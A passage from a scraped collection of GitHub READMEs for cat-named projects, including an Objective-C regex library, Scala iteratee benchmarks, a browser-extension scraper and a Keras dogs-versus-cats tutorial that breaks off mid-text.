\"RegExCategories.h\"\n\n\n\n\n## Quick Examples\nHere are some short examples of how you might use the code. The documentation section below goes into full detail.\n//Create an NSRegularExpression\nRx* rx = RX(@\"\\\\d\");\nRx* rx = [Rx rx:@\"\\\\d\"];\nRx* rx = [Rx rx:@\"\\\\d\" ignoreCase:YES];\n\n//Test if a string matches\nBOOL isMatch = [@\"2345\" isMatch:RX(@\"^\\\\d+$\")];\n\n//Get first match\nNSString* age = [@\"My dog is 3.\" firstMatch:RX(@\"\\\\d+\")];\n\n//Get matches as a string array\nNSArray* words = [@\"Hey pal\" matches:RX(@\"\\\\w+\")];\n// words => @[ @\"Hey\", @\"pal\" ]\n\n//Get first match with details\nRxMatch* match = [@\"12.34, 56.78\" firstMatchWithDetails:RX(@\"\\\\d+([.]\\\\d+)\")];\n// match.value => @\"12.34\"\n// match.range => NSRangeMake(0, 5);\n// match.original => @\"12.34, 56.78\";\n// match.groups => @[ RxMatchGroup, RxMatchGroup ];\n\n//Replace with a template string\nNSString* result = [@\"My dog is 12.\" replace:RX(@\"\\\\d+\") with:@\"old\"];\n// result => @\"My dog is old.\"\n\n//Replace with a block\nNSString* result = [RX(@\"\\\\w+\") replace:@\"hi bud\" withBlock:^(NSString* match){\n  return [NSString stringWithFormat:@\"%i\", match.length];\n}];\n// result => @\"2 3\"\n\n//Replace with a block that has the match details\nNSString* result = [RX(@\"\\\\w+\") replace:@\"hi bud\" withDetailsBlock:^(RxMatch* match){\n  return [NSString stringWithFormat:@\"%i\", match.value.length];\n}];\n// result => @\"2 3\"\nYou can also use the extensions in Swift, though macros are not available. Most examples are in Objective-C but here are some Swift examples:\n//Create an NSRegularExpression\nvar rx = NSRegularExpression(pattern:\"\\\\d\");\nvar rx = NSRegularExpression.rx(\"\\\\d\", ignoreCase:true);\nvar rx = NSRegularExpression.rx(\"\\\\d\", options: .CaseInsensitive);\n\n//Test if Matches a String\nvar isMatch = rx.isMatch(\"3 dogs\");\n\n## Documentation\n\n## Macros\nFirst off, we create an alias for NSRegularExpression named Rx. So instead of writing NSRegularExpression you can now use Rx. (this can be disabled - read on)\n//this\nNSRegularExpression* rx = [[NSRegularExpression alloc] initWithPattern:@\"\\\\d\"];\n\n//can be written as\nRx* rx = [[Rx alloc] initWithPattern:@\"\\\\d\"];\nWe've also created a macro RX() for quick regex creation. Just pass a string and an NSRegularExpression object is created:\n//this\nNSRegularExpression* rx = [[NSRegularExpression alloc] initWithPattern:@\"\\\\d\"];\n\n//can be written as\nRx* rx = RX(@\"\\\\d\");\nThese macros can be disabled by defining DisableRegExCategoriesMacros before you include the script. For example:\n#define DisableRegExCategoriesMacros\n#include \"RegExCategories.h\"\n\n## Creation\nHere are a few convenient ways to create an NSRegularExpression.\n######Class Method - rx\nRx* rx = [Rx rx:@\"\\\\d+\"];\n\n######Class Method - ignore case\nRx* rx = [Rx rx:@\"\\\\d+\" ignoreCase:YES];\n\n######Class Method - with options\nRx* rx = [Rx rx:@\"\\\\d+\" options:NSRegularExpressionCaseInsensitive];\n\n######Init With Pattern\nRx* rx = [[Rx alloc] initWithPattern:@\"\\d+\"];\n\n######String Extension\nRx* rx = [@\"\\\\d+\" toRx];\n\n######String Extension - ignore case\nRx* rx = [@\"\\\\d+\" toRxIgnoreCase:YES];\n\n######String Extension - with options\nRx* rx = [@\"\\\\d+\" toRxWithOptions:NSRegularExpressionCaseInsensitive];\n\n\n##Test If Match\nTests whether a regular expression matches a string.\n######From NSRegularExpression\nBOOL isMatch = [RX(@\"\\\\d+\") isMatch:@\"Dog #1\"];\n// => true\n\n######From NSString\nBOOL isMatch = [@\"Dog #1\" isMatch:RX(@\"\\\\d+\")];\n// => true\n\n\n##Index Of Match\nGet the character index of the first match. If no match is found, then -1.\n######From NSRegularExpression\nint index = [RX(@\"\\\\d+\") indexOf:@\"Buy 1 dog or buy 2?\"];\n// => 4\n\nint index = [RX(@\"\\\\d+\") indexOf:@\"Buy a dog?\"];\n// => -1\n\n######From NSString\nint index = [@\"Buy 1 dog or buy 2?\" indexOf:RX(@\"\\\\d+\")];\n// => 4\n\nint index = [@\"Buy a dog?\" indexOf:RX(@\"\\\\d+\")];\n// => -1\n\n\n##Split A String\nSplit an NSString using a regex as the delimiter. The result is an NSArray of NSString objects.\n######From NSRegularExpression\nNSArray* pieces = [RX(@\"[ ,]\") split:@\"A dog,cat\"];\n// => @[@\"A\", @\"dog\", @\"cat\"]\n\n######From NSString\nNSArray* pieces = [@\"A dog,cat\" split:RX(@\"[ ,]\")];\n// => @[@\"A\", @\"dog\", @\"cat\"]\n\nEmpty results are not removed. For example:\nNSArray* pieces = [@\",a,,b,\" split:RX(@\"[,]\")];\n// => @[@\"\", @\"a\", @\"\", @\"b\", @\"\"]\n\n\n##First Match\nGet the first match as an NSString. If no match is found, nil is returned.\nFirst Match from NSString\nNSString* match = [@\"55 or 99 spiders\" firstMatch:RX(@\"\\\\d+\")];\n// => @\"55\"\n\nNSString* match = [@\"A lot of spiders\" firstMatch:RX(@\"\\\\d+\")];\n// => nil\n\nFirst Match from NSRegularExpression\nNSString* match = [RX(@\"\\\\d+\") firstMatch:@\"55 or 99 spiders\"];\n// => @\"55\"\n\nFirst Match With Details (from NSString or NSRegularExpression)\nIf you want more details about the match (such as the range or captured groups), then use match with details. It returns an RxMatch object if a match is found, otherwise nil.\nRxMatch* match = [@\"55 or 99 spiders\" firstMatchWithDetails:RX(@\"\\\\d+\")];\n// => { value: @\"55\", range:NSRangeMake(0, 2), groups:[RxMatchGroup, ...] }\n\nRxMatch* match = [@\"A lot of spiders\" firstMatchWithDetails:RX(@\"\\\\d+\")];\n// => nil\n\nRxMatch* match = [RX(@\"\\\\d+\") firstMatchWithDetails:@\"55 or 99 spiders\"];\n// => { value: @\"55\", range:NSRangeMake(0, 2), groups:[RxMatchGroup, ...] }\n\n\n##Matches\nMatches (from NSString or NSRegularExpression)\nMatches returns all matches as an NSArray, each as an NSString. If no matches are found, the NSArray is empty.\nNSArray* matches = [@\"55 or 99 spiders\" matches:RX(@\"\\\\d+\")];\n// => @[ @\"55\", @\"99\" ]\n\nNSArray* matches = [RX(@\"\\\\d+\") matches:@\"55 or 99 spiders\"];\n// => @[ @\"55\", @\"99\" ]\n\nMatches With Details (from NSString or NSRegularExpression)\nMatches with details returns all matches as an NSArray, each object is an RxMatch object.\nNSArray* matches = [@\"55 or 99 spiders\" matchesWithDetails:RX(@\"\\\\d+\")];\n// => @[ RxMatch, RxMatch ]\n\nNSArray* matches = [RX(@\"\\\\d+\") matchesWithDetails:@\"55 or 99 spiders\"];\n// => @[ RxMatch, RxMatch ]\n\n\n##Replace\nReplace With Template\nReplace allows you to replace matched substrings with a templated string.\nNSString* result = [RX(@\"ruf+\") replace:@\"ruf ruff!\" with:@\"meow\"];\n// => @\"meow meow!\"\n\nReplace With Block\nReplace with block lets you pass an objective-c block that returns the replacement NSString. The block receives an NSString which is the matched substring.\nNSString* result = [RX(@\"[A-Z]+\") replace:@\"i love COW\" withBlock:^(NSString*){ return @\"lamp\"; }];\n// => @\"i love lamp\"\n\nReplace With Details Block\nSimilar to replace with block, but this block receives an RxMatch for each match. This gives you details about the match such as captured groups.\nNSString* result = [RX(@\"\\\\w+\") replace:@\"two three\" withDetailsBlock:^(RxMatch* match){ \n    return [NSString stringWithFormat:@\"%i\", match.value.length];\n  }];\n// => @\"3 5\"\n\nReplace From NSString\nReplace can also be called from an NSString.\nNSString* result = [@\"ruf ruff!\" replaceRX(@\"ruf+\") with:@\"meow\"];\n// => @\"meow meow!\"\n\nNSString* result = [@\"i love COW\" replace:RX(@\"[A-Z]+\") withBlock:^(NSString*){ return @\"lamp\"; }];\n// => @\"i love lamp\"\n\nNSString* result = [@\"two three\" replace:RX(@\"\\\\w+\") withDetailsBlock:^(RxMatch* match){ \n    return [NSString stringWithFormat:@\"%i\", match.value.length];\n}];\n// => @\"3 5\"\n\n\n## RxMatch Objects\nRxMatch and RxMatchGroup are objects that contain information about a match and its groups.\n@interface RxMatch : NSObject\n\n\t/* The substring that matched the expression. */\n\t@property (retain) NSString* value;    \n\n\t/* The range of the original string that was matched. */\n\t@property (assign) NSRange   range;    \n\n\t/* Each object is an RxMatchGroup. */\n\t@property (retain) NSArray*  groups;   \n\n\t/* The full original string that was matched against.  */\n\t@property (retain) NSString* original; \n\n@end\n\n@interface RxMatchGroup : NSObject\n\n   /* The substring matched for the group. */\n\t@property (retain) NSString* value;\n\t\n   /* The range of the captured group, relative to the original string. */\n\t@property (assign) NSRange range;\n\t\t\n@end\n\n## Support\nIf you need help, submit an issue or send a pull request. Please include appropriate unit tests in any pull requests.\nYou can visit my website at joshwright.com or tweet at me @BendyTree.\n\n## Licensing\nMIT License - do whatever you want, just (1) provide attribution and (2) don't hold me liable.\n\n## Testing\nThis repository includes unit tests written in the XCTest framework.\n\n## Alternatives\nThere are a few other options for using regular expressions in objective-c including:\n\nRaw NSRegularExpression - Built in to Foundation since OSX 10.7 and iOS 4.0.\nRegexKitLite - Bridge between NSString and ICU Regex\nCocoaRegex - Alternative bridge to ICU\n\n\n## Who Uses It?\nHere is a list of projects using Objective-C RegEx Categories. If you're using it, tweet at me (@BendyTree) and I'll add you to the list:\n\nMemorize Anything\nSpeakY\nOyster 1.2\nLoaf \u2014 Recipes for Easy Cooking"}, {"title": "travisbrown/iteratee", "language": "Scala", "content": "iteratee.io\n\n\n\n\nThis project is an iteratee implementation for Cats that began as a port of\nScalaz's iteratee package, although the API and implementation are now\nvery different from Scalaz's. There are API docs (but they're a work in progress), and\nI've published a blog post introducing the project.\nThe motivations for the port are similar to those for circe\u2014in particular I'm aiming for a\nmore consistent API, better performance, and better documentation.\nNote that this library doesn't support many of the use cases that fs2 (formerly Scalaz\nStream) is designed to handle. It doesn't support nondeterministic reading from multiple streams,\nfor example, and in general is a less appropriate choice for situations where concurrency and\nparallelism are primary goals. Where the use cases of fs2 and this library do overlap, however, it's\noften likely to be a simpler, faster solution.\nThe initial performance benchmarks look promising. For example, here are the throughput results for\nsumming a sequence of numbers with this library and cats.Id (II), this library and Monix's\nTask (IM), this library and Scalaz's Task (IT), this library and Twitter futures (IR),\nScalaz Stream (S), scalaz-iteratee (Z), play-iteratee (P), the Scala\ncollections library (C), and fs2 (F). Higher numbers are better.\nBenchmark                      Mode  Cnt      Score     Error  Units\nInMemoryBenchmark.sumInts0II  thrpt   80  10225.388 \u00b1 191.612  ops/s\nInMemoryBenchmark.sumInts1IM  thrpt   80  13395.800 \u00b1  30.912  ops/s\nInMemoryBenchmark.sumInts2IT  thrpt   80  18609.579 \u00b1  47.491  ops/s\nInMemoryBenchmark.sumInts3IR  thrpt   80  15999.740 \u00b1 114.949  ops/s\nInMemoryBenchmark.sumInts4S   thrpt   80     72.074 \u00b1   1.209  ops/s\nInMemoryBenchmark.sumInts5Z   thrpt   80    310.472 \u00b1   4.368  ops/s\nInMemoryBenchmark.sumInts6P   thrpt   80     43.071 \u00b1   0.543  ops/s\nInMemoryBenchmark.sumInts7C   thrpt   80  12975.042 \u00b1  48.702  ops/s\nInMemoryBenchmark.sumInts8F   thrpt   80   9610.699 \u00b1  41.936  ops/s\n\nAnd the results for collecting the first 10,000 values from an infinite stream of non-negative\nnumbers into a Vector:\nBenchmark                         Mode  Cnt     Score    Error  Units\nStreamingBenchmark.takeLongs0II  thrpt   80  2787.725 \u00b1 16.812  ops/s\nStreamingBenchmark.takeLongs1IM  thrpt   80  1617.848 \u00b1 19.899  ops/s\nStreamingBenchmark.takeLongs2IT  thrpt   80  1052.494 \u00b1  7.707  ops/s\nStreamingBenchmark.takeLongs3IR  thrpt   80   979.514 \u00b1 26.197  ops/s\nStreamingBenchmark.takeLongs4S   thrpt   80    56.882 \u00b1  0.969  ops/s\nStreamingBenchmark.takeLongs5Z   thrpt   80   154.103 \u00b1 10.350  ops/s\nStreamingBenchmark.takeLongs6P   thrpt   80     1.216 \u00b1  0.005  ops/s\nStreamingBenchmark.takeLongs7C   thrpt   80  3273.158 \u00b1 55.187  ops/s\nStreamingBenchmark.takeLongs8F   thrpt   80     7.915 \u00b1  0.044  ops/s\n\nAnd allocation rates (lower is better):\nBenchmark                                            Mode  Cnt           Score          Error  Units\nInMemoryBenchmark.sumInts0II:gc.alloc.rate.norm     thrpt   20      159953.462 \u00b1       11.863   B/op\nInMemoryBenchmark.sumInts1IM:gc.alloc.rate.norm     thrpt   20      160203.272 \u00b1        5.949   B/op\nInMemoryBenchmark.sumInts2IT:gc.alloc.rate.norm     thrpt   20      160622.026 \u00b1        6.323   B/op\nInMemoryBenchmark.sumInts3IR:gc.alloc.rate.norm     thrpt   20      160398.303 \u00b1        6.685   B/op\nInMemoryBenchmark.sumInts4S:gc.alloc.rate.norm      thrpt   20    63936897.241 \u00b1   320928.043   B/op\nInMemoryBenchmark.sumInts5Z:gc.alloc.rate.norm      thrpt   20    16401510.998 \u00b1        6.115   B/op\nInMemoryBenchmark.sumInts6P:gc.alloc.rate.norm      thrpt   20    13802446.593 \u00b1   229152.745   B/op\nInMemoryBenchmark.sumInts7C:gc.alloc.rate.norm      thrpt   20      159851.547 \u00b1       14.556   B/op\nInMemoryBenchmark.sumInts8F:gc.alloc.rate.norm      thrpt   20      260454.260 \u00b1     1522.736   B/op\n\nBenchmark                                            Mode  Cnt           Score          Error  Units\nStreamingBenchmark.takeLongs0II:gc.alloc.rate.norm  thrpt   20     3043720.338 \u00b1        0.018   B/op\nStreamingBenchmark.takeLongs1IM:gc.alloc.rate.norm  thrpt   20     3444961.639 \u00b1        4.168   B/op\nStreamingBenchmark.takeLongs2IT:gc.alloc.rate.norm  thrpt   20     5804308.795 \u00b1    61718.228   B/op\nStreamingBenchmark.takeLongs3IR:gc.alloc.rate.norm  thrpt   20     5124124.296 \u00b1        5.147   B/op\nStreamingBenchmark.takeLongs4S:gc.alloc.rate.norm   thrpt   20    75347149.315 \u00b1   555268.150   B/op\nStreamingBenchmark.takeLongs5Z:gc.alloc.rate.norm   thrpt   20    28588033.048 \u00b1   238419.245   B/op\nStreamingBenchmark.takeLongs6P:gc.alloc.rate.norm   thrpt   20  1206196498.000 \u00b1    71329.621   B/op\nStreamingBenchmark.takeLongs7C:gc.alloc.rate.norm   thrpt   20      526752.310 \u00b1        0.029   B/op\nStreamingBenchmark.takeLongs8F:gc.alloc.rate.norm   thrpt   20   531380973.839 \u00b1 13505581.754   B/op\n\nLicense\niteratee.io is licensed under the Apache License, Version 2.0 (the\n\"License\"); you may not use this software except in compliance with the License.\nUnless required by applicable law or agreed to in writing, software\ndistributed under the License is distributed on an \"AS IS\" BASIS,\nWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\nSee the License for the specific language governing permissions and\nlimitations under the License."}, {"title": "tinrab/meower", "language": "Go", "content": "Meower: A Social Network for Cats\nThe underlying source code for the Building a Microservices Application in Go Following the CQRS Pattern article."}, {"title": "funcool/cats", "language": "Clojure", "content": "cats\n\n\n\n\nAnd there are my cats, engaged in a ritual that goes back thousands of years, tranquilly licking themselves after the meal. Practical animals, they prefer to have others provide the food ... some of them do. There must have been a split between the cats who accepted domestication and those who did not.\n \n-- William S. Burroughs, The Cat Inside\n\n\nCategory Theory and algebraic abstractions for Clojure and ClojureScript.\nStable:\n\nDocumentation: http://funcool.github.io/cats/latest/\nAPI reference: http://funcool.github.io/cats/latest/api/\n\nTests\nTo run Clojure tests:\nlein test\n\nTo run ClojureScript tests:\n./scripts/build\nnode out/tests.js"}, {"title": "SophieDeBenedetto/catbook-redux", "language": "JavaScript", "content": "CatBook\nA React Redux application that consumes data from the CatBook Rails 5 API. Users can log in, create, edit, delete and view cats and their associated hobbies (yes, cats have hobbies).\nYou can play around with the deployed app here. Log in with sample user:\n\nusername: sophie\npassword: password\n\nUses:\n\nReact\nRedux\nReact Router\nRedux Thunk middleware\nCustom JWT authentication system integrates with JWT auth on the Rails API side.\n\nWhy Did I Build This?\nThis app was built out to accompany my series of eight blog posts on building a simpel React Redux application.\nYou can check out those posts here, view my post on JWT auth with React here, and my post on deploying React Redux to Heroku here."}, {"title": "easychen/catgate", "language": "Vue", "content": "CatGate\nCatGate \u662f\u4e00\u4e2a\u57fa\u4e8e\u6d4f\u89c8\u5668\u63d2\u4ef6\u7684\u6570\u636e\u6293\u53d6\u5de5\u5177\u3002\u505a\u6210\u6d4f\u89c8\u5668\u63d2\u4ef6\u65e0\u9700\u6a21\u62df\u767b\u5165\uff0c\u80fd\u6700\u771f\u5b9e\u7684\u6a21\u4eff\u7528\u6237\u884c\u4e3a\u548c\u7279\u5f81\u3002\n\u6f14\u793a\u89c6\u9891\nhttp://weibo.com/1088413295/F9P1izhY2\n\u529f\u80fd\n\n\n\n\u2460 CatGate \u4f1a\u8bbf\u95ee\u8fd9\u4e2aURL\uff0c\u8fd9\u4e2aURL\u5e94\u8be5\u8fd4\u56de\u4e00\u4e2aJson\u683c\u5f0f\u7684\u6570\u7ec4\uff0c\u6bcf\u4e00\u4e2a\u5143\u7d20\u4e00\u4e2a\u5b57\u7b26\u4e32\uff08\u5373\u7f51\u5740\uff09\u3002\u70b9 \u2461 \u6309\u94ae\u5373\u53ef\u8f7d\u5165\u6570\u636e\uff0c\u5e76\u53ef\u6309 \u2462 \u8fdb\u884c\u67e5\u770b\uff0c\u4f1a\u81ea\u52a8\u6392\u91cd\u3002\n\n\n\u2464 CatGate \u6293\u53d6\u5230\u6570\u636e\u540e\uff0c\u4f1a\u76f4\u63a5 POST \u7ed9\u8fd9\u4e2aURL\uff0ckey \u4e3a content , \u901a\u8fc7 $_REQUEST['content'] \u5373\u53ef\u83b7\u53d6\u6293\u53d6\u5185\u5bb9\u3002\n\n\n\u2465 \u9ed8\u8ba4\u4e00\u79d2\u6293\u53d6\u4e00\u6b21\uff0c\u5982\u679c\u6293\u53d6\u5931\u8d25\u592a\u591a\uff0c\u53ef\u4ee5\u589e\u52a0\u79d2\u6570\u3002\n\n\n\u2463 \u8fd9\u662f\u4e00\u4e2a\u9ad8\u7ea7\u7528\u6cd5\uff0c\u5c31\u662f \u2460 \u8fd9\u4e2a URL \u53ef\u4ee5\u4e0d\u505c\u7684\u65b0\u589e URL\uff0cCatGate \u4f1a\u81ea\u52a8\u6bcf\u9694\u4e00\u79d2\uff08\u53ef\u8bbe\u7f6e\uff09\u53bb\u6293\u53d6\u5e76\u5408\u5e76\u8fdb\u6765\u3002\n\n\nDemo\n\u8fdb\u5165 php \u76ee\u5f55\uff0c\u8fd0\u884c php -S localhost:8000 \u5373\u53ef\u6d4b\u8bd5\u3002\n\nlist.php \u8fd9\u4e2a\u9875\u9762\u751f\u6210\u4e86\u8981\u6293\u53d6\u7684\u9875\u9762\u5217\u8868\uff0c\u9ed8\u8ba4\u662f\u5fae\u535a\u6536\u85cf\u7684\u9875\u9762\u3002\nsave.php \u8fd9\u4e2a\u9875\u9762\u5b9a\u4e49\u4e86\u5982\u4f55\u5904\u7f6e\u6293\u5230\u7684\u6570\u636e\uff0c\u9ed8\u8ba4\u662f\u4fdd\u6301\u6210\u4e3a\u6587\u4ef6\u3002\n\n\u5b89\u88c5\u63d2\u4ef6\n\u5546\u5e97\u5730\u5740\uff1ahttps://chrome.google.com/webstore/detail/catgate/nncgefdjnpnipajdfnindaiockdadpab\n\u5982\u679c\u4f60\u4e0d\u60f3\u6216\u4e0d\u80fd\u5728Chrome\u5546\u5e97\u5b89\u88c5\u63d2\u4ef6\uff0c\u53ef\u624b\u5de5\u5b89\u88c5\u3002\nchrome > extentsion > load unpacked extension > ./ext\nLicense\nCC\uff0c\u4fdd\u7559\u7b7e\u540d\u3001\u975e\u5546\u7528\u3002"}, {"title": "ypwhs/dogs_vs_cats", "language": "Jupyter Notebook", "content": "\u672c\u6587\u4f1a\u901a\u8fc7 Keras \u642d\u5efa\u4e00\u4e2a\u6df1\u5ea6\u5377\u79ef\u795e\u7ecf\u7f51\u7edc\u6765\u8bc6\u522b\u4e00\u5f20\u56fe\u7247\u662f\u732b\u8fd8\u662f\u72d7\uff0c\u5728\u9a8c\u8bc1\u96c6\u4e0a\u7684\u51c6\u786e\u7387\u53ef\u4ee5\u8fbe\u523099.6%\uff0c\u5efa\u8bae\u4f7f\u7528\u663e\u5361\u6765\u8fd0\u884c\u8be5\u9879\u76ee\u3002\u672c\u9879\u76ee\u4f7f\u7528\u7684 Keras \u7248\u672c\u662f1.2.2\u3002\u5982\u679c\u4f60\u4f7f\u7528\u7684\u662f\u66f4\u9ad8\u7ea7\u7684\u7248\u672c\uff0c\u53ef\u80fd\u4f1a\u7a0d\u6709\u53c2\u6570\u53d8\u5316\u3002\n\u732b\u72d7\u5927\u6218\n\u6570\u636e\u96c6\u6765\u81ea kaggle \u4e0a\u7684\u4e00\u4e2a\u7ade\u8d5b\uff1aDogs vs. Cats\uff0c\u8bad\u7ec3\u96c6\u670925000\u5f20\uff0c\u732b\u72d7\u5404\u5360\u4e00\u534a\u3002\u6d4b\u8bd5\u96c612500\u5f20\uff0c\u6ca1\u6709\u6807\u5b9a\u662f\u732b\u8fd8\u662f\u72d7\u3002\n\u279c  \u732b\u72d7\u5927\u6218 ls train | head\ncat.0.jpg\ncat.1.jpg\ncat.10.jpg\ncat.100.jpg\ncat.1000.jpg\ncat.10000.jpg\ncat.10001.jpg\ncat.10002.jpg\ncat.10003.jpg\ncat.10004.jpg\n\u279c  \u732b\u72d7\u5927\u6218 ls test | head\n1.jpg\n10.jpg\n100.jpg\n1000.jpg\n10000.jpg\n10001.jpg\n10002.jpg\n10003.jpg\n10004.jpg\n10005.jpg\n\n\u4e0b\u9762\u662f\u8bad\u7ec3\u96c6\u7684\u4e00\u90e8\u5206\u4f8b\u5b50\uff1a\n\n\u6570\u636e\u9884\u5904\u7406\n\u7531\u4e8e\u6211\u4eec\u7684\u6570\u636e\u96c6\u7684\u6587\u4ef6\u540d\u662f\u4ee5type.num.jpg\u8fd9\u6837\u7684\u65b9\u5f0f\u547d\u540d\u7684\uff0c\u6bd4\u5982cat.0.jpg\uff0c\u4f46\u662f\u4f7f\u7528 Keras \u7684 ImageDataGenerator \u9700\u8981\u5c06\u4e0d\u540c\u79cd\u7c7b\u7684\u56fe\u7247\u5206\u5728\u4e0d\u540c\u7684\u6587\u4ef6\u5939\u4e2d\uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5bf9\u6570\u636e\u96c6\u8fdb\u884c\u9884\u5904\u7406\u3002\u8fd9\u91cc\u6211\u4eec\u91c7\u53d6\u7684\u601d\u8def\u662f\u521b\u5efa\u7b26\u53f7\u94fe\u63a5(symbol link)\uff0c\u8fd9\u6837\u7684\u597d\u5904\u662f\u4e0d\u7528\u590d\u5236\u4e00\u904d\u56fe\u7247\uff0c\u5360\u7528\u4e0d\u5fc5\u8981\u7684\u7a7a\u95f4\u3002\nimport os\nimport shutil\n\ntrain_filenames = os.listdir('train')\ntrain_cat = filter(lambda x:x[:3] == 'cat', train_filenames)\ntrain_dog = filter(lambda x:x[:3] == 'dog', train_filenames)\n\ndef rmrf_mkdir(dirname):\n    if os.path.exists(dirname):\n        shutil.rmtree(dirname)\n    os.mkdir(dirname)\n\nrmrf_mkdir('train2')\nos.mkdir('train2/cat')\nos.mkdir('train2/dog')\n\nrmrf_mkdir('test2')\nos.symlink('../test/', 'test2/test')\n\nfor filename in train_cat:\n    os.symlink('../../train/'+filename, 'train2/cat/'+filename)\n\nfor filename in train_dog:\n    os.symlink('../../train/'+filename, 'train2/dog/'+filename)\n\u6211\u4eec\u53ef\u4ee5\u4ece\u4e0b\u9762\u770b\u5230\u6587\u4ef6\u5939\u7684\u7ed3\u6784\uff0ctrain2\u91cc\u9762\u6709\u4e24\u4e2a\u6587\u4ef6\u5939\uff0c\u5206\u522b\u662f\u732b\u548c\u72d7\uff0c\u6bcf\u4e2a\u6587\u4ef6\u5939\u91cc\u662f12500\u5f20\u56fe\u3002\n\u251c\u2500\u2500 test [12500 images]\n\u251c\u2500\u2500 test.zip\n\u251c\u2500\u2500 test2\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 test -> ../test/\n\u251c\u2500\u2500 train [25000 images]\n\u251c\u2500\u2500 train.zip\n\u2514\u2500\u2500 train2\n    \u251c\u2500\u2500 cat [12500 images]\n    \u2514\u2500\u2500 dog [12500 images]\n\n\u5bfc\u51fa\u7279\u5f81\u5411\u91cf\n\u5bf9\u4e8e\u8fd9\u4e2a\u9898\u76ee\u6765\u8bf4\uff0c\u4f7f\u7528\u9884\u8bad\u7ec3\u7684\u7f51\u7edc\u662f\u6700\u597d\u4e0d\u8fc7\u7684\u4e86\uff0c\u7ecf\u8fc7\u524d\u671f\u7684\u6d4b\u8bd5\uff0c\u6211\u4eec\u6d4b\u8bd5\u4e86 ResNet50 \u7b49\u4e0d\u540c\u7684\u7f51\u7edc\uff0c\u4f46\u662f\u6392\u540d\u90fd\u4e0d\u9ad8\uff0c\u73b0\u5728\u770b\u6765\u53ea\u6709\u4e00\u4e24\u767e\u540d\u7684\u6837\u5b50\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u63d0\u9ad8\u6211\u4eec\u7684\u6a21\u578b\u8868\u73b0\u3002\u90a3\u4e48\u4e00\u79cd\u6709\u6548\u7684\u65b9\u6cd5\u662f\u7efc\u5408\u5404\u4e2a\u4e0d\u540c\u7684\u6a21\u578b\uff0c\u4ece\u800c\u5f97\u5230\u4e0d\u9519\u7684\u6548\u679c\uff0c\u517c\u542c\u5219\u660e\u3002\u5982\u679c\u662f\u76f4\u63a5\u5728\u4e00\u4e2a\u5de8\u5927\u7684\u7f51\u7edc\u540e\u9762\u52a0\u6211\u4eec\u7684\u5168\u8fde\u63a5\uff0c\u90a3\u4e48\u8bad\u7ec310\u4ee3\u5c31\u9700\u8981\u8dd1\u5341\u6b21\u5de8\u5927\u7684\u7f51\u7edc\uff0c\u800c\u4e14\u6211\u4eec\u7684\u5377\u79ef\u5c42\u90fd\u662f\u4e0d\u53ef\u8bad\u7ec3\u7684\uff0c\u90a3\u4e48\u8fd9\u4e2a\u8ba1\u7b97\u5c31\u662f\u6d6a\u8d39\u7684\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u591a\u4e2a\u4e0d\u540c\u7684\u7f51\u7edc\u8f93\u51fa\u7684\u7279\u5f81\u5411\u91cf\u5148\u4fdd\u5b58\u4e0b\u6765\uff0c\u4ee5\u4fbf\u540e\u7eed\u7684\u8bad\u7ec3\uff0c\u8fd9\u6837\u505a\u7684\u597d\u5904\u662f\u6211\u4eec\u4e00\u65e6\u4fdd\u5b58\u4e86\u7279\u5f81\u5411\u91cf\uff0c\u5373\u4f7f\u662f\u5728\u666e\u901a\u7b14\u8bb0\u672c\u4e0a\u4e5f\u80fd\u8f7b\u677e\u8bad\u7ec3\u3002\nfrom keras.models import *\nfrom keras.layers import *\nfrom keras.applications import *\nfrom keras.preprocessing.image import *\n\nimport h5py\n\ndef write_gap(MODEL, image_size, lambda_func=None):\n    width = image_size[0]\n    height = image_size[1]\n    input_tensor = Input((height, width, 3))\n    x = input_tensor\n    if lambda_func:\n        x = Lambda(lambda_func)(x)\n    \n    base_model = MODEL(input_tensor=x, weights='imagenet', include_top=False)\n    model = Model(base_model.input, GlobalAveragePooling2D()(base_model.output))\n\n    gen = ImageDataGenerator()\n    train_generator = gen.flow_from_directory(\"train2\", image_size, shuffle=False, \n                                              batch_size=16)\n    test_generator = gen.flow_from_directory(\"test2\", image_size, shuffle=False, \n                                             batch_size=16, class_mode=None)\n\n    train = model.predict_generator(train_generator, train_generator.nb_sample)\n    test = model.predict_generator(test_generator, test_generator.nb_sample)\n    with h5py.File(\"gap_%s.h5\"%MODEL.func_name) as h:\n        h.create_dataset(\"train\", data=train)\n        h.create_dataset(\"test\", data=test)\n        h.create_dataset(\"label\", data=train_generator.classes)\n\nwrite_gap(ResNet50, (224, 224))\nwrite_gap(InceptionV3, (299, 299), inception_v3.preprocess_input)\nwrite_gap(Xception, (299, 299), xception.preprocess_input)\n\n\u4e3a\u4e86\u590d\u7528\u4ee3\u7801\uff0c\u6211\u89c9\u5f97\u5199\u4e00\u4e2a\u51fd\u6570\u662f\u975e\u5e38\u6709\u5fc5\u8981\u7684\uff0c\u90a3\u4e48\u6211\u4eec\u7684\u51fd\u6570\u5c31\u9700\u8981\u8f93\u5165\u6a21\u578b\uff0c\u8f93\u5165\u56fe\u7247\u7684\u5927\u5c0f\uff0c\u4ee5\u53ca\u9884\u5904\u7406\u51fd\u6570\uff0c\u56e0\u4e3a Xception \u548c Inception V3 \u90fd\u9700\u8981\u5c06\u6570\u636e\u9650\u5b9a\u5728 (-1, 1) \u7684\u8303\u56f4\u5185\uff0c\u7136\u540e\u6211\u4eec\u5229\u7528 GlobalAveragePooling2D \u5c06\u5377\u79ef\u5c42\u8f93\u51fa\u7684\u6bcf\u4e2a\u6fc0\u6d3b\u56fe\u76f4\u63a5\u6c42\u5e73\u5747\u503c\uff0c\u4e0d\u7136\u8f93\u51fa\u7684\u6587\u4ef6\u4f1a\u975e\u5e38\u5927\uff0c\u4e14\u5bb9\u6613\u8fc7\u62df\u5408\u3002\u7136\u540e\u6211\u4eec\u5b9a\u4e49\u4e86\u4e24\u4e2a generator\uff0c\u5229\u7528 model.predict_generator \u51fd\u6570\u6765\u5bfc\u51fa\u7279\u5f81\u5411\u91cf\uff0c\u6700\u540e\u6211\u4eec\u9009\u62e9\u4e86 ResNet50, Xception, Inception V3 \u8fd9\u4e09\u4e2a\u6a21\u578b\uff08\u5982\u679c\u6709\u5174\u8da3\u4e5f\u53ef\u4ee5\u5bfc\u51fa VGG 